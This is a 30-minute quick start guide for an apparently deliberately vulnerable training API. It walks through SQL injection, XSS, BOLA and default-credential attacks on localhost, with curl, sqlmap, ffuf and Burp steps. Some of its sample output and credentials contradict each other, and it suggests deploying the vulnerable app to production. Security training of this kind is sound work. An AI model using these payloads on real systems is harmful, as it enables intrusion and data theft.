# SecurityForge - Zero to Hero Quick Start (30 Minutes)

## ⏱️ 30-MINUTE QUICK START GUIDE

### **Minutes 1-5: Download & Install**

```bash
# Clone SecurityForge
git clone https://github.com/your-username/SecurityForge.git
cd SecurityForge

# Install Python dependencies
pip install -r requirements.txt

# Download tools (choose your method)
# Postman: https://www.postman.com/downloads/
# Burp Suite: https://portswigger.net/burp/communitydownload
# OWASP ZAP: https://www.zaproxy.org/download/
# FFUF: go install github.com/ffuf/ffuf@latest
# SQLMap: pip install sqlmap
```

---

### **Minutes 6-10: Start Backend**

```bash
# Start SecurityForge API
python vulnshop_pro.py

# In new terminal, verify it's running
curl http://localhost:5000/api/health

# Expected output:
# {"status": "healthy", "version": "2.0.0"}

# Default credentials
# Email: admin@example.com
# Password: Admin123!
```

---

### **Minutes 11-20: Test First Vulnerability (SQL Injection)**

```bash
# Method 1: Using CURL (simplest)
# Test for SQLi in /api/search

curl "http://localhost:5000/api/search?q=test' OR '1'='1"

# If vulnerable, you'll get extra results
# Result: response should show all products instead of filtered


# Method 2: Using Postman (recommended)
# 1. Open Postman
# 2. Click "Import"
# 3. Select: SecurityForge_Postman_Collection.json
# 4. Select request: "SQLi - Basic Injection"
# 5. Click "Send"
# 6. Check response for SQL error or unintended data


# Method 3: Using FFUF (fast fuzzing)
ffuf -u "http://localhost:5000/api/search?q=FUZZ" \
  -w sql_injection_payloads.txt \
  -mc 200 \
  -fs 0

# Will find working SQLi payloads instantly


# Method 4: Using SQLMap (automated)
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --batch \
  --dbs

# Automatically detects and exploits SQLi
# Output: identified databases
```

---

### **Minutes 21-25: Explore Dashboard**

```bash
# Open browser to: http://localhost:5000
# Login: admin@example.com / Admin123!

# Features:
# 1. Dashboard → View all 20 vulnerabilities
# 2. Vulnerabilities → Click each for detailed info
# 3. Audit Log → See all admin activity
# 4. Learning Progress → Track your progress
# 5. Tools Guide → Access all 5 tool guides
```

---

### **Minutes 26-30: Pick One Tool & Practice**

```bash
# Choose your tool:

# FASTEST (Burp Suite):
# 1. Open Burp Suite
# 2. Set proxy to http://localhost:8080
# 3. Click "Proxy" tab
# 4. Navigate to http://localhost:5000
# 5. You'll see all requests in the proxy
# 6. Right-click request → Send to Intruder
# 7. Choose parameter → Click "Attack"
# 8. Watch as Burp finds SQLi vulnerabilities

# BEST FOR BEGINNERS (Postman):
# 1. Open Postman
# 2. Click "Collections" → Click triangle to expand SecurityForge
# 3. Click "SQLi - Basic Injection"
# 4. Click "Send"
# 5. Look at the Response
# 6. Click "Tests" tab to see what the test checks

# MOST POWERFUL (SQLMap):
# 1. Open terminal
# 2. Run: sqlmap -u "http://localhost:5000/api/search?q=test" --dbs
# 3. Wait ~30 seconds
# 4. You'll see: [*] the back-end DBMS is ... [*] fetching database names
# 5. Result: Lists all databases

# CREATE CUSTOM PAYLOAD (Advanced):
# In Postman:
# 1. Create new request
# 2. GET http://localhost:5000/api/search?q=
# 3. Add parameter: q = admin' AND SLEEP(5)--
# 4. Send
# 5. Notice it takes 5 seconds (time-based SQLi!)
```

---

## 📚 COMPREHENSIVE GUIDE MAP

### **Which Guide to Read First?**

**If you're new to security:**
```
Start Here → TOOLS_INTEGRATION_GUIDE.md (5 min read)
   ↓
Read about: POSTMAN_GUIDE.md (start simple API testing)
   ↓
Try: Follow along in Postman
   ↓
Explore: Dashboard vulnerabilities page
```

**If you know some security:**
```
Start Here → QUICK_REFERENCE.md (2 min lookup)
   ↓
Pick your favorite tool:
   ├→ POSTMAN_GUIDE.md (for API testing)
   ├→ BURP_SUITE_GUIDE.md (for interception)
   ├→ OWASP_ZAP_GUIDE.md (for automation)
   ├→ FFUF_GUIDE.md (for fuzzing)
   └→ SQLMAP_GUIDE.md (for SQLi)
   ↓
Practice on 3+ vulnerabilities
   ↓
Read: TOOLS_INTEGRATION_GUIDE.md (combine tools)
```

**If you're a security professional:**
```
Skim: PROJECT_TRANSFORMATION.md (understand the structure)
   ↓
Deep dive: TOOLS_INTEGRATION_GUIDE.md (optimization)
   ↓
Reference: API_DOCUMENTATION.md (architecture)
   ↓
Customize: Modify vulnshop_pro.py for your scenarios
   ↓
Deploy: DEPLOYMENT_GUIDE.md (for your infrastructure)
```

---

## 🎯 ACTUAL EXPLOITATION EXAMPLES

### **Example 1: Find SQL Injection in 2 Minutes**

```bash
# Step 1: Start tool (SQLMap is fastest)
sqlmap -u "http://localhost:5000/api/search?q='" --batch

# Step 2: Wait for output
# [*] Testing connection...
# [+] Parameter 'q' IS vulnerable to Boolean-based blind SQL injection
# [+] Payload: q=1' AND SLEEP(5)-- -

# Step 3: Exploit it
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --dbs \
  --batch

# Step 4: Output shows databases
# [*] securityforge
# [*] information_schema
# [*] mysql

# That's it! You found a vulnerability
```

---

### **Example 2: Bypass Authentication in 3 Minutes**

```bash
# Step 1: Try default credentials
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"admin"}'

# Result: {"access_token":"eyJ0..."}
# Success! You bypassed weak auth

# Step 2: Use the token
curl http://localhost:5000/api/users \
  -H "Authorization: Bearer eyJ0..."

# Result: Full user database!
```

---

### **Example 3: Access Others' Data (BOLA) in 2 Minutes**

```bash
# Step 1: Login as regular user
curl -X POST http://localhost:5000/api/login \
  -d '{"email":"user@example.com","password":"User123!"}'

# Result: {"access_token":"eyJ0...","user_id":5}

# Step 2: Try accessing other user's orders
curl http://localhost:5000/api/users/1/orders \
  -H "Authorization: Bearer eyJ0..."

# Result: {"orders":[...]} 
# You accessed user #1's data with user #5's token!
# That's BOLA (Broken Object Level Authorization)
```

---

### **Example 4: Inject XSS Payload in 2 Minutes**

```bash
# Step 1: Create a comment with JavaScript
curl -X POST http://localhost:5000/api/comments \
  -H "Content-Type: application/json" \
  -d '{"text":"<img src=x onerror=alert(123)>"}'

# Step 2: Retrieve the comment
curl http://localhost:5000/api/comments

# Result: Response includes unescaped HTML
# When a browser renders this, alert(123) executes
# That's XSS (Cross-Site Scripting)
```

---

## 🔧 TOOL SETUP IN DETAILS

### **Postman (5 minutes)**

```bash
# Step 1: Download & Install
# https://www.postman.com/downloads/
# Run installer, follow prompts

# Step 2: Import Collection
# 1. Open Postman
# 2. File → Import
# 3. Choose: SecurityForge_Postman_Collection.json
# 4. Choose: SecurityForge_Environment.json
# 5. Success! You have pre-built tests

# Step 3: Configure Environment
# 1. Environments (top right dropdown)
# 2. SecurityForge_Environment
# 3. Set variables:
#    - target_url: http://localhost:5000
#    - auth_token: (leave empty, auto-filled by login)
# 4. Save

# Step 4: Run a Test
# 1. Collections → SQLi - Basic Injection
# 2. Click "Send"
# 3. See response
# 4. Click "Tests" tab to see what passed/failed
```

---

### **Burp Suite (5 minutes)**

```bash
# Step 1: Download Community Edition
# https://portswigger.net/burp/communitydownload
# Run installer

# Step 2: Configure Proxy
# 1. Open Burp Suite
# 2. Proxy tab → Options
# 3. Proxy listeners: Ensure 127.0.0.1:8080 is ON
# 4. Import CA certificate to browser

# Step 3: Configure Browser
# Firefox (recommended for Burp):
# 1. Settings → Network → Manual proxy
# 2. HTTP Proxy: 127.0.0.1:8080
# 3. HTTPS Proxy: 127.0.0.1:8080
# 4. No proxy for: localhost

# Step 4: Start Intercepting
# 1. Burp: Proxy → Intercept is OFF
# 2. Browser: Navigate to http://localhost:5000/api/search?q=test
# 3. You'll see request in Burp Proxy tab
# 4. Right-click → Send to Intruder
# 5. Choose parameter → Set payloads
# 6. Click "Start Attack"
```

---

### **OWASP ZAP (5 minutes)**

```bash
# Step 1: Download & Install
# https://www.zaproxy.org/download/
# Run installer

# Step 2: Configure ZAP
# 1. Open OWASP ZAP
# 2. Tools → Options → Network → Local Servers
# 3. Set Address: 127.0.0.1, Port: 8080

# Step 3: Baseline Scan (Quick)
# 1. Top menu: Tools → Options → API
# 2. Generate API key (copy it)
# 3. In terminal:
#    zaproxy -cmd -quickurl http://localhost:5000

# Step 4: Check Results
# 1. ZAP: Alerts tab shows vulnerabilities
# 2. Right-click vulnerability → Details
# 3. See payload, response, fixes
```

---

### **FFUF (2 minutes)**

```bash
# Step 1: Install
# Option A: go install github.com/ffuf/ffuf@latest
# Option B: brew install ffuf
# Option C: Download from GitHub releases

# Step 2: Test it works
ffuf -h

# Step 3: Run your first fuzz
ffuf -u "http://localhost:5000/api/FUZZ" \
  -w endpoints.txt

# Output shows discovered endpoints
# Creates report.json with results
```

---

### **SQLMap (2 minutes)**

```bash
# Step 1: Install
pip install sqlmap

# Step 2: Test it works
sqlmap --version

# Step 3: Run your first scan
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --batch

# Output shows if parameter is vulnerable
# Automatically injects payloads
# Tests different SQLi types
```

---

## 📊 VULNERABILITY QUICK REFERENCE

**All 20 vulnerabilities at a glance:**

### **Web Top 10 (2021/2025)**

| # | Name | Quick Test |
|---|------|-----------|
| A01 | Broken Access Control | Try another user's ID |
| A02 | Cryptographic Failures | Look for unencrypted data |
| A03 | **Injection (SQL, XSS)** | Use: `' OR '1'='1` |
| A04 | Insecure Design | Check business logic |
| A05 | Security Misconfiguration | Look for DEBUG mode |
| A06 | Vulnerable Components | Scan dependencies |
| A07 | **Authentication Failures** | Try default credentials |
| A08 | Data Integrity Failures | Modify cached data |
| A09 | Logging Issues | Check audit trails |
| A10 | SSRF/Deserialization | Try internal paths |

### **API Top 10 (2021/2023)**

| # | Name | Quick Test |
|---|------|-----------|
| API1 | **BOLA** | Change object ID in URL |
| API2 | Broken Authentication | Use expired token |
| API3 | Object Property Authorization | Modify properties |
| API4 | Resource Consumption | Send huge requests |
| API5 | Function Level Authorization | Access admin functions |
| API6 | Business Logic Abuse | Trigger logic bugs |
| API7 | **SSRF** | Make API fetch localhost |
| API8 | Asset Management | Find missing versions |
| API9 | Monitoring Failures | Exploit unlogged actions |
| API10 | Unsafe APIs | Call deprecated functions |

---

## 💡 NEXT STEPS AFTER QUICK START

### **For Absolute Beginners:**
1. ✅ Finish 30-minute quick start (you are here)
2. Read POSTMAN_GUIDE.md (1 hour)
3. Practice SQL Injection in Postman (1 hour)
4. Try XSS attack in Postman (1 hour)
5. Read TOOLS_INTEGRATION_GUIDE.md (30 min)
6. Follow 3-day pentesting workflow (3 days)

### **For Intermediate Learners:**
1. ✅ Skim quick start (5 min)
2. Read all 5 tool guides (3 hours)
3. Complete TOOLS_INTEGRATION_GUIDE.md (1 hour)
4. Practice complex exploitation (3 days)
5. Automate scanning with GitHub Actions (1 day)
6. Create custom payloads (1 day)

### **For Advanced Professionals:**
1. Read PROJECT_TRANSFORMATION.md (15 min)
2. Deploy SecurityForge to production (30 min)
3. Customize vulnerabilities for your scenarios (1 day)
4. Integrate with your CI/CD pipeline (1 day)
5. Create advanced guides for your team (2 days)
6. Teach others (ongoing)

---

## 🎓 LEARNING OUTCOMES AFTER 4 WEEKS

```
Week 1: Learn 5 tools
  Day 1-2: Postman basics
  Day 3-4: Burp Suite proxy  
  Day 5-7: ZAP automation

Week 2: Practice exploits
  Day 1-2: SQL Injection deep dive
  Day 3: XSS exploitation
  Day 4-5: BOLA enumeration
  Day 6-7: Auth bypass

Week 3: Tool mastery
  Day 1-2: FFUF fuzzing
  Day 3-4: SQLMap automation
  Day 5-7: Combine tools

Week 4: Real-world scenarios
  Day 1-2: Multi-stage exploitation
  Day 3: WAF bypass techniques
  Day 4: Report generation
  Day 5-7: Professional assessment
```

**After this:** You can perform real penetration tests independently!

---

## 📈 SUCCESS CHECKLIST

- [ ] Downloaded all files
- [ ] Installed Python dependencies
- [ ] Started SecurityForge backend
- [ ] Accessed dashboard (admin@example.com)
- [ ] Made successful API request with CURL
- [ ] Found SQL Injection vulnerability
- [ ] Downloaded at least 3 of 5 tools
- [ ] Imported Postman collection
- [ ] Ran first Postman test
- [ ] Read at least 2 tool guides
- [ ] Completed basic exploitation
- [ ] Shared with a friend/colleague
- [ ] Deployed to cloud (Railway/Render)
- [ ] Created GitHub issue with feedback

---

## 🚀 SHARE YOUR PROGRESS

```bash
# When you successfully exploit a vulnerability:
# Tweet about it!

"Just found SQL Injection in SecurityForge using SQLMap! 
Real-world security training made easy. Check it out:
https://github.com/your-username/SecurityForge
#CyberSecurity #Pentesting #Learning"

# Fork, Star, and Share!
# Help others learn security too
```

---

**You just started your security career. Congratulations! 🎉**

**Time to next vulnerable app found: ~30 minutes**  
**Time to first exploitation: ~45 minutes**  
**Time to professional pentest: ~4 weeks**

